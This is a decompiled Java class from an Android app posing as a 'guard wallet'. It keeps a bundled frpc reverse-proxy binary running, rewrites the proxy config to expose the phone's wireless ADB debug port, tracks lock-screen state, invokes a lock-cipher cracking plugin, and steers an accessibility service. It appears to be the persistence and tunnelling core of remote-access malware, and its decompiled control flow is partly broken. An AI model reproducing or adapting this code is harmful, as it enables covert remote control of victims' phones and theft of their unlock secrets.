package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.helper.AbstractC0181d;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.helper.AbstractC0195r;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.receiver.ScreenBroadcastReceiver;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.RewriteDebugPortVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import com.guard.wallet.utils.C0253i;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.ListIterator;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import p000a.AbstractC0000a;
import p005h.C0318e;
import p007j.C0350e;
import p014r.EnumC0891d;
import p015s.C0896a;

/* renamed from: com.guard.wallet.thread.b */
/* loaded from: classes.dex */
public final class C0233b extends TimerTask {

    /* renamed from: q */
    public static final ReentrantLock f338q = new ReentrantLock();

    /* renamed from: b */
    public Timer f340b;

    /* renamed from: c */
    public String f341c;

    /* renamed from: d */
    public String f342d;

    /* renamed from: e */
    public LinkedList f343e;

    /* renamed from: f */
    public Process f344f;

    /* renamed from: g */
    public boolean f345g;

    /* renamed from: k */
    public final LinkedList f349k;

    /* renamed from: l */
    public final AtomicReference f350l;

    /* renamed from: m */
    public final AtomicLong f351m;

    /* renamed from: n */
    public final AtomicLong f352n;

    /* renamed from: o */
    public final AtomicLong f353o;

    /* renamed from: p */
    public final AtomicLong f354p;

    /* renamed from: a */
    public final C0896a f339a = new C0896a(5000, 2);

    /* renamed from: h */
    public boolean f346h = false;

    /* renamed from: i */
    public final AtomicInteger f347i = new AtomicInteger(0);

    /* renamed from: j */
    public final LinkedList f348j = new LinkedList();

    public C0233b() {
        LinkedList linkedList = new LinkedList();
        this.f349k = linkedList;
        this.f350l = new AtomicReference(EnumC0891d.INTERACTIVE_STATUS_UNKNOWN);
        this.f351m = new AtomicLong(0L);
        this.f352n = new AtomicLong(0L);
        this.f353o = new AtomicLong(0L);
        this.f354p = new AtomicLong(0L);
        this.f343e = new LinkedList();
        m574c();
        linkedList.add(4194304);
        linkedList.add(2048);
        linkedList.add(64);
        if (Build.VERSION.SDK_INT >= 33) {
            linkedList.add(33554432);
        }
        linkedList.add(131072);
        linkedList.add(16777216);
    }

    /* renamed from: a */
    public static boolean m570a() {
        String i02 = AbstractC0251g.i0();
        if (AbstractC0026q.m151B(i02) || AbstractC0026q.m189v(i02)) {
            return true;
        }
        Log.d("CheckProcessThread", "frpc.ini 文件不存在");
        AbstractC0207l.m438u();
        return false;
    }

    /* renamed from: d */
    public static String m571d() {
        String y02 = AbstractC0251g.y0();
        if (AbstractC0026q.m151B(y02)) {
            return null;
        }
        Log.d("CheckProcessThread", "APP Lib目录:".concat(y02));
        String concat = y02.concat("/").concat("libfrpc.so");
        if (AbstractC0026q.m190w(concat)) {
            return concat;
        }
        return null;
    }

    /* renamed from: f */
    public static void m572f(int i2) {
        String m708l = AbstractC0252h.m708l("lockSubscribeId");
        if (!AbstractC0026q.m151B(m708l)) {
            AbstractC0207l.m425h(new ReqListenHelper(m708l, Integer.valueOf(i2)));
            AbstractC0252h.m719w("lockSubscribeId");
        }
        if (AbstractC0195r.m382k()) {
            AbstractC0195r.m378g(i2 == 4);
        }
        AbstractC0192o.m365f(null, i2 == 4);
    }

    /* renamed from: b */
    public final boolean m573b() {
        boolean z2 = !AbstractC0026q.m154E(7400);
        this.f345g = z2;
        return z2;
    }

    /* renamed from: c */
    public final void m574c() {
        this.f341c = m571d();
        String i02 = AbstractC0251g.i0();
        if (!AbstractC0026q.m151B(i02)) {
            this.f342d = i02.concat("/").concat("frpc.ini");
            Log.d("CheckProcessThread", "APP 数据目录:".concat(i02));
        }
        if (AbstractC0026q.m151B(this.f341c) || AbstractC0026q.m151B(this.f342d)) {
            return;
        }
        Log.d("CheckProcessThread", this.f341c);
        Log.d("CheckProcessThread", this.f342d);
        this.f343e.clear();
        this.f343e.add(this.f341c);
        this.f343e.add("-c");
        this.f343e.add(this.f342d);
    }

    /* JADX WARN: Code restructure failed: missing block: B:119:0x0197, code lost:
    
        if (r0 != null) goto L90;
     */
    /* JADX WARN: Code restructure failed: missing block: B:63:0x017b, code lost:
    
        if (r0 != null) goto L90;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x019c, code lost:
    
        r0 = new com.guard.wallet.entity.CommandResult(r7, r8, r9);
     */
    /* JADX WARN: Code restructure failed: missing block: B:90:0x0199, code lost:
    
        r0.destroyForcibly();
     */
    /* JADX WARN: Removed duplicated region for block: B:132:0x01b6 A[DONT_GENERATE, FINALLY_INSNS] */
    /* JADX WARN: Removed duplicated region for block: B:134:? A[DONT_GENERATE, FINALLY_INSNS, SYNTHETIC] */
    /* renamed from: e */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m575e() {
        CommandResult commandResult;
        BufferedReader bufferedReader;
        BufferedReader bufferedReader2;
        Throwable th;
        Process process;
        String m571d = m571d();
        this.f341c = m571d;
        if (AbstractC0026q.m151B(m571d) || !AbstractC0026q.m190w(this.f341c)) {
            Log.d("CheckProcessThread", "libfrpc.so 文件不存在");
            return;
        }
        this.f341c = m571d();
        String i02 = AbstractC0251g.i0();
        if (!AbstractC0026q.m151B(i02)) {
            this.f342d = i02.concat("/").concat("frpc.ini");
            Log.d("CheckProcessThread", "APP 数据目录:".concat(i02));
        }
        if (!AbstractC0026q.m151B(this.f341c) && !AbstractC0026q.m151B(this.f342d)) {
            Log.d("CheckProcessThread", this.f341c);
            Log.d("CheckProcessThread", this.f342d);
            this.f343e.clear();
            this.f343e.add(this.f341c);
            this.f343e.add("reload");
            this.f343e.add("-c");
            this.f343e.add(this.f342d);
        }
        if (m570a() && !this.f343e.isEmpty()) {
            String y02 = AbstractC0251g.y0();
            BufferedReader bufferedReader3 = null;
            if (AbstractC0026q.m151B(y02)) {
                y02 = null;
            } else {
                Log.d("CheckProcessThread", "APP Lib目录:".concat(y02));
            }
            if (m573b()) {
                boolean z2 = false;
                CommandResult m188u = AbstractC0026q.m188u(new String[]{"ps -ef | grep frpc"}, false, true);
                if (m188u.getResult() == 0 && m188u.getSuccessMsgLines() != null && !m188u.getSuccessMsgLines().isEmpty()) {
                    Iterator<String> it = m188u.getSuccessMsgLines().iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            break;
                        }
                        String next = it.next();
                        Log.d("CheckProcessThread", next);
                        if (!AbstractC0026q.m151B(next) && next.contains(this.f342d)) {
                            z2 = true;
                            break;
                        }
                    }
                }
                if (!z2 || AbstractC0026q.m151B(y02)) {
                    return;
                }
                LinkedList linkedList = this.f343e;
                int i2 = -1;
                if (linkedList == null || linkedList.size() == 0) {
                    commandResult = new CommandResult(-1, null, null);
                } else {
                    LinkedList linkedList2 = new LinkedList();
                    LinkedList linkedList3 = new LinkedList();
                    try {
                        ProcessBuilder processBuilder = new ProcessBuilder(linkedList);
                        processBuilder.directory(new File(y02));
                        process = processBuilder.start();
                        if (process != null) {
                            try {
                                i2 = !process.waitFor(30L, TimeUnit.SECONDS) ? 1 : 0;
                                bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                try {
                                    bufferedReader2 = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                                    while (true) {
                                        try {
                                            String readLine = bufferedReader.readLine();
                                            if (readLine == null) {
                                                break;
                                            } else {
                                                linkedList2.add(readLine);
                                            }
                                        } catch (Throwable th2) {
                                            th = th2;
                                            try {
                                                AbstractC0026q.m187t("ShellUtils", th);
                                                if (bufferedReader != null) {
                                                    try {
                                                        bufferedReader.close();
                                                    } catch (IOException e2) {
                                                        AbstractC0026q.m186s("ShellUtils", e2);
                                                    }
                                                }
                                                if (bufferedReader2 != null) {
                                                    bufferedReader2.close();
                                                }
                                            } finally {
                                            }
                                        }
                                    }
                                    while (true) {
                                        String readLine2 = bufferedReader2.readLine();
                                        if (readLine2 == null) {
                                            break;
                                        } else {
                                            linkedList3.add(readLine2);
                                        }
                                    }
                                    bufferedReader3 = bufferedReader;
                                } catch (Throwable th3) {
                                    bufferedReader2 = null;
                                    th = th3;
                                }
                            } catch (Throwable th4) {
                                bufferedReader2 = null;
                                th = th4;
                                bufferedReader = null;
                            }
                        } else {
                            bufferedReader2 = null;
                        }
                        if (bufferedReader3 != null) {
                            try {
                                bufferedReader3.close();
                            } catch (IOException e3) {
                                AbstractC0026q.m186s("ShellUtils", e3);
                            }
                        }
                        if (bufferedReader2 != null) {
                            bufferedReader2.close();
                        }
                    } catch (Throwable th5) {
                        bufferedReader = null;
                        bufferedReader2 = null;
                        th = th5;
                        process = null;
                    }
                }
                if (commandResult.getResult() != 0 || commandResult.getSuccessMsgLines() == null || commandResult.getSuccessMsgLines().isEmpty()) {
                    return;
                }
                for (String str : commandResult.getSuccessMsgLines()) {
                    if (!AbstractC0026q.m151B(str) && str.contains("reload success")) {
                        Log.d("CheckProcessThread", "frpc.ini".concat(" 热加载成功"));
                        return;
                    }
                }
            }
        }
    }

    /* renamed from: g */
    public final void m576g() {
        if (this.f340b == null) {
            this.f340b = new Timer();
        }
        this.f340b.schedule(this, 5000L, 5000L);
    }

    /* JADX WARN: Removed duplicated region for block: B:129:0x02b1  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x02ca  */
    /* JADX WARN: Removed duplicated region for block: B:135:0x02dd  */
    /* JADX WARN: Removed duplicated region for block: B:152:0x0327 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:163:0x02d6  */
    /* JADX WARN: Removed duplicated region for block: B:164:0x02be  */
    /* JADX WARN: Removed duplicated region for block: B:204:0x0414  */
    /* JADX WARN: Removed duplicated region for block: B:209:0x0424  */
    /* JADX WARN: Removed duplicated region for block: B:225:0x0483  */
    /* JADX WARN: Removed duplicated region for block: B:226:0x0452 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:246:0x044c A[EDGE_INSN: B:246:0x044c->B:221:0x044c BREAK  A[LOOP:1: B:207:0x041e->B:243:0x041e], SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:253:0x0409 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:258:0x03ff A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:263:0x03f5 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:278:0x0491  */
    @Override // java.util.TimerTask, java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        boolean z2;
        LinkedList<String> linkedList;
        ListIterator listIterator;
        IOException e2;
        FileInputStream fileInputStream;
        InputStreamReader inputStreamReader;
        BufferedReader bufferedReader;
        boolean z3;
        String str;
        String str2;
        String y02;
        Process process;
        Process process2;
        String str3;
        if (f338q.tryLock()) {
            if (C0318e.m844S() != null && !AbstractC0026q.m154E(7912)) {
                AbstractC0207l.m427j();
            }
            Log.d("CheckProcessThread", "check process thread is running");
            synchronized (this) {
                z2 = false;
                try {
                    int m705i = AbstractC0252h.m705i("screenState");
                    if (m705i == 2) {
                        m705i = 1;
                    }
                    if (m705i == 3) {
                        m705i = 0;
                    }
                    LockPatternVO B0 = AbstractC0251g.B0();
                    int i2 = !AbstractC0249e.m621j() ? 0 : (B0.getIsKeyguardLocked().intValue() == 0 && B0.getIsDeviceSecure().intValue() == 1) ? 4 : 1;
                    if (!Objects.equals(Integer.valueOf(i2), 0)) {
                        LockActivity.m330a();
                    }
                    if (!Objects.equals(Integer.valueOf(m705i), Integer.valueOf(i2))) {
                        if (i2 == 0) {
                            m572f(i2);
                            if (MyAccessibilityService.m554P() != null && MyAccessibilityService.m554P().m529j()) {
                                MyAccessibilityService.f321q.set(true);
                                Log.d("CheckProcessThread", "stopLocalAccessibilityDelegate");
                                MyAccessibilityService.m554P().m519D();
                            }
                            if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                                MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                                C0224c.m450f();
                            }
                            AbstractC0181d.m345a();
                            AbstractC0252h.m719w("lockBatchId");
                        }
                        if (i2 == 1 && AbstractC0251g.p0()) {
                            AbstractC0252h.m683D(Long.valueOf(ScreenBroadcastReceiver.f283b.m723a()), "lockBatchId");
                        }
                        if (i2 == 4) {
                            if (MainApplication.getInstance() != null) {
                                if (!MainApplication.getInstance().isUserUnlockedInstance()) {
                                    MainApplication.getInstance().unlockedInstance();
                                }
                                if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                                    MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                                    C0224c.m451g();
                                }
                            }
                            if (MainApplication.getInstance() != null) {
                                MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
                            }
                            m572f(i2);
                            AtomicBoolean atomicBoolean = MyAccessibilityService.f321q;
                            if (atomicBoolean.get()) {
                                atomicBoolean.set(false);
                                AbstractC0251g.F0(2);
                            }
                        }
                        if (i2 == 0) {
                            str3 = "android.intent.action.SCREEN_OFF";
                        } else {
                            str3 = "android.intent.action.SCREEN_ON";
                            if (i2 != 1) {
                                if (i2 == 2) {
                                    str3 = "android.intent.action.DREAMING_STARTED";
                                } else if (i2 == 3) {
                                    str3 = "android.intent.action.DREAMING_STOPPED";
                                } else if (i2 == 4) {
                                    str3 = "android.intent.action.USER_PRESENT";
                                }
                            }
                        }
                        AbstractC0252h.m683D(Integer.valueOf(i2), "screenState");
                        C0253i c0253i = ScreenBroadcastReceiver.f283b;
                        AbstractC0252h.m687H(i2, str3);
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("CheckProcessThread", e3);
                }
            }
            m570a();
            m573b();
            if (!Objects.equals(this.f350l.get(), EnumC0891d.INTERACTIVE_STATUS_UNKNOWN) && this.f351m.get() > 0) {
                boolean m621j = AbstractC0249e.m621j();
                AtomicLong atomicLong = this.f354p;
                AtomicLong atomicLong2 = this.f353o;
                if (!m621j || AbstractC0251g.p0()) {
                    long currentTimeMillis = System.currentTimeMillis();
                    if (atomicLong2.get() == 0) {
                        atomicLong2.set(currentTimeMillis);
                    }
                    long j2 = currentTimeMillis - atomicLong2.get();
                    if (j2 > 0) {
                        long j3 = j2 / 60000;
                        if (j3 > atomicLong.get()) {
                            atomicLong.set(j3);
                            if (MainApplication.getInstance() != null) {
                                MainApplication.getInstance().offerStrategyEvent("SCREEN_OFF_LONG_DURATION");
                            }
                        }
                    }
                } else {
                    atomicLong2.set(0L);
                    atomicLong.set(0L);
                }
                long currentTimeMillis2 = System.currentTimeMillis();
                AtomicLong atomicLong3 = this.f351m;
                if (currentTimeMillis2 - atomicLong3.get() > 60000) {
                    AtomicReference atomicReference = this.f350l;
                    Object obj = atomicReference.get();
                    EnumC0891d enumC0891d = EnumC0891d.INTERACTIVE_STATUS_IDLE;
                    if (!Objects.equals(obj, enumC0891d)) {
                        atomicReference.set(enumC0891d);
                        atomicLong3.set(currentTimeMillis2);
                        this.f352n.set(0L);
                    }
                }
                if (Objects.equals(this.f350l.get(), EnumC0891d.INTERACTIVE_STATUS_IDLE)) {
                    long currentTimeMillis3 = System.currentTimeMillis() - this.f351m.get();
                    if (currentTimeMillis3 > 0) {
                        long j4 = currentTimeMillis3 / 60000;
                        AtomicLong atomicLong4 = this.f352n;
                        if (j4 > atomicLong4.get()) {
                            atomicLong4.set(j4);
                            if (MainApplication.getInstance() != null) {
                                MainApplication.getInstance().offerStrategyEvent("INTERACTIVE_IDLE_LONG_DURATION");
                            }
                        }
                    }
                }
            }
            String str4 = null;
            if (this.f345g) {
                this.f347i.set(0);
                MessageRecordVO messageRecordVO = new MessageRecordVO();
                MessageBodyVO messageBodyVO = new MessageBodyVO();
                messageRecordVO.setIntentCode("android.app.service.net.rpc.running");
                messageRecordVO.setExtraBody(messageBodyVO);
                this.f339a.m1330a(messageRecordVO);
                AbstractC0252h.m685F();
            } else {
                MessageRecordVO messageRecordVO2 = new MessageRecordVO();
                MessageBodyVO messageBodyVO2 = new MessageBodyVO();
                messageRecordVO2.setIntentCode("android.app.service.net.rpc.stopped");
                messageRecordVO2.setExtraBody(messageBodyVO2);
                this.f339a.m1330a(messageRecordVO2);
                AbstractC0252h.m685F();
                if (this.f347i.incrementAndGet() >= 3 && !this.f346h) {
                    this.f347i.set(0);
                    String i02 = AbstractC0251g.i0();
                    String m571d = m571d();
                    this.f341c = m571d;
                    if (AbstractC0026q.m151B(m571d) || !AbstractC0026q.m190w(this.f341c)) {
                        Log.d("CheckProcessThread", "libfrpc.so 文件不存在");
                    } else {
                        m574c();
                        if (!AbstractC0026q.m151B(i02) && m570a()) {
                            try {
                                process2 = this.f344f;
                            } catch (Exception e4) {
                                AbstractC0026q.m186s("CheckProcessThread", e4);
                            }
                            if (process2 != null) {
                                if (process2.exitValue() < 0) {
                                    z3 = false;
                                    if (z3 && !this.f343e.isEmpty() && !m573b()) {
                                        if (AbstractC0026q.m151B(i02)) {
                                            str2 = AbstractC0000a.m30z(i02, "/libfrpc.so.out.log");
                                            str = AbstractC0000a.m30z(i02, "/libfrpc.so.error.log");
                                        } else {
                                            str = null;
                                            str2 = null;
                                        }
                                        y02 = AbstractC0251g.y0();
                                        if (AbstractC0026q.m151B(y02)) {
                                            Log.d("CheckProcessThread", "APP Lib目录:".concat(y02));
                                        } else {
                                            y02 = null;
                                        }
                                        if (!AbstractC0026q.m151B(y02)) {
                                            LinkedList linkedList2 = this.f343e;
                                            if (linkedList2 != null && !linkedList2.isEmpty()) {
                                                try {
                                                    ProcessBuilder processBuilder = new ProcessBuilder(linkedList2);
                                                    processBuilder.directory(new File(y02));
                                                    if (!AbstractC0026q.m151B(str2)) {
                                                        processBuilder.redirectOutput(new File(str2));
                                                    }
                                                    if (!AbstractC0026q.m151B(str)) {
                                                        processBuilder.redirectError(new File(str));
                                                    }
                                                    process = processBuilder.start();
                                                } catch (Throwable th) {
                                                    AbstractC0026q.m187t("ShellUtils", th);
                                                }
                                                if (process != null) {
                                                    Log.d("ShellUtils", "命令行启动完成");
                                                    this.f344f = process;
                                                    if (process != null) {
                                                        try {
                                                            if (m573b()) {
                                                                Log.d("CheckProcessThread", "libfrpc.so 运行成功");
                                                            }
                                                        } catch (Exception e5) {
                                                            AbstractC0026q.m186s("CheckProcessThread", e5);
                                                        }
                                                    }
                                                    Log.e("CheckProcessThread", "libfrpc.so 运行失败");
                                                }
                                            }
                                            process = null;
                                            this.f344f = process;
                                            if (process != null) {
                                            }
                                            Log.e("CheckProcessThread", "libfrpc.so 运行失败");
                                        }
                                    }
                                }
                            }
                            z3 = true;
                            if (z3) {
                                if (AbstractC0026q.m151B(i02)) {
                                }
                                y02 = AbstractC0251g.y0();
                                if (AbstractC0026q.m151B(y02)) {
                                }
                                if (!AbstractC0026q.m151B(y02)) {
                                }
                            }
                        }
                    }
                }
            }
            if (!this.f348j.isEmpty()) {
                LinkedList linkedList3 = this.f348j;
                if (!linkedList3.isEmpty()) {
                    Integer num = (Integer) linkedList3.get(linkedList3.size() - 1);
                    linkedList3.clear();
                    if (!AbstractC0026q.m151B(this.f342d)) {
                        String str5 = this.f342d;
                        if (!AbstractC0026q.m151B(str5)) {
                            File file = new File(str5);
                            if (file.exists() && file.isFile() && file.canRead()) {
                                Log.d("FileUtils", "文件存在,能读取:" + str5);
                                try {
                                    fileInputStream = new FileInputStream(file);
                                } catch (IOException e6) {
                                    e2 = e6;
                                    fileInputStream = null;
                                }
                                try {
                                    inputStreamReader = new InputStreamReader(fileInputStream);
                                    try {
                                        bufferedReader = new BufferedReader(inputStreamReader);
                                    } catch (IOException e7) {
                                        e2 = e7;
                                        bufferedReader = null;
                                    }
                                } catch (IOException e8) {
                                    e2 = e8;
                                    inputStreamReader = null;
                                    bufferedReader = null;
                                    AbstractC0026q.m186s("FileUtils", e2);
                                    if (fileInputStream != null) {
                                        try {
                                            fileInputStream.close();
                                        } catch (IOException e9) {
                                            AbstractC0026q.m186s("FileUtils", e9);
                                        }
                                    }
                                    if (inputStreamReader != null) {
                                        try {
                                            inputStreamReader.close();
                                        } catch (IOException e10) {
                                            AbstractC0026q.m186s("FileUtils", e10);
                                        }
                                    }
                                    if (bufferedReader != null) {
                                        try {
                                            bufferedReader.close();
                                        } catch (IOException e11) {
                                            AbstractC0026q.m186s("FileUtils", e11);
                                        }
                                    }
                                    linkedList = null;
                                    if (linkedList != null) {
                                    }
                                    String str6 = AbstractC0207l.f252a;
                                    if (num != null) {
                                        RewriteDebugPortVO rewriteDebugPortVO = new RewriteDebugPortVO();
                                        rewriteDebugPortVO.setDeviceId(AbstractC0252h.m708l("deviceId"));
                                        rewriteDebugPortVO.setDebugPort(num);
                                        new C0204i("http://127.0.0.1:7912").m405d(rewriteDebugPortVO, "/rewriteDebugPort", new C0350e(1));
                                    }
                                    f338q.unlock();
                                }
                                try {
                                    linkedList = new LinkedList();
                                    while (true) {
                                        String readLine = bufferedReader.readLine();
                                        if (readLine == null) {
                                            break;
                                        } else {
                                            linkedList.add(readLine);
                                        }
                                    }
                                    fileInputStream.close();
                                    inputStreamReader.close();
                                    bufferedReader.close();
                                } catch (IOException e12) {
                                    e2 = e12;
                                    AbstractC0026q.m186s("FileUtils", e2);
                                    if (fileInputStream != null) {
                                    }
                                    if (inputStreamReader != null) {
                                    }
                                    if (bufferedReader != null) {
                                    }
                                    linkedList = null;
                                    if (linkedList != null) {
                                    }
                                    String str62 = AbstractC0207l.f252a;
                                    if (num != null) {
                                    }
                                    f338q.unlock();
                                }
                                if (linkedList != null && !linkedList.isEmpty()) {
                                    listIterator = linkedList.listIterator();
                                    while (true) {
                                        if (!listIterator.hasNext()) {
                                            break;
                                        }
                                        String str7 = (String) listIterator.next();
                                        if (str7 != null) {
                                            if (str7.contains("wifi-debug-port")) {
                                                z2 = true;
                                            }
                                            if (str7.contains("local_port") && z2) {
                                                listIterator.set("local_port = ".concat(String.valueOf(num)));
                                                break;
                                            }
                                        }
                                    }
                                    if (!linkedList.isEmpty()) {
                                        try {
                                            StringBuilder sb = new StringBuilder();
                                            for (String str8 : linkedList) {
                                                if (str8 != null) {
                                                    sb.append(str8);
                                                    sb.append('\n');
                                                }
                                            }
                                            str4 = sb.toString();
                                        } catch (Exception e13) {
                                            AbstractC0026q.m186s("FileUtils", e13);
                                        }
                                    }
                                    if (AbstractC0026q.m170U(this.f342d, str4)) {
                                        Log.d("CheckProcessThread", "网络代理文件已修改");
                                        m575e();
                                    }
                                }
                            }
                        }
                        linkedList = null;
                        if (linkedList != null) {
                            listIterator = linkedList.listIterator();
                            while (true) {
                                if (!listIterator.hasNext()) {
                                }
                            }
                            if (!linkedList.isEmpty()) {
                            }
                            if (AbstractC0026q.m170U(this.f342d, str4)) {
                            }
                        }
                    }
                    String str622 = AbstractC0207l.f252a;
                    if (num != null && num.intValue() > 0) {
                        RewriteDebugPortVO rewriteDebugPortVO2 = new RewriteDebugPortVO();
                        rewriteDebugPortVO2.setDeviceId(AbstractC0252h.m708l("deviceId"));
                        rewriteDebugPortVO2.setDebugPort(num);
                        new C0204i("http://127.0.0.1:7912").m405d(rewriteDebugPortVO2, "/rewriteDebugPort", new C0350e(1));
                    }
                }
            }
            f338q.unlock();
        }
    }
}
